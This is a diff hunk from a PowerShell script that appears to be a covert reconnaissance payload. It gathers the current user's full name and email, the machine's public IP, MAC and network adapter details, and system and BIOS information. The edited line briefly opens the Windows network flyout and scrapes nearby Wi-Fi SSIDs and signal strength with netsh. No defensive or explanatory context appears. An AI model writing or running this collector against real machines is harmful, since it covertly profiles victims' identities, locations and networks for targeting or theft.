@@ -255,7 +255,7 @@ $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullNam
 $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.DefaultIPGateway.length -gt 1}
-$NearbyWifi = $wshell = New-Object -ComObject wscript.shell; explorer.exe ms-availablenetworks: ; $wshell.AppActivate('explorer.exe'); sleep 1; $wshell.SendKeys('{ESC}'); sleep 4; (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim()
+$NearbyWifi = $wshell = New-Object -ComObject wscript.shell; explorer.exe ms-availablenetworks: ; $wshell.AppActivate("explorer"); sleep 1; $wshell.SendKeys('{ESC}'); sleep 4; (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim()
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
 $computerSystem = Get-CimInstance CIM_ComputerSystem
 $computerBIOS = Get-CimInstance CIM_BIOSElement
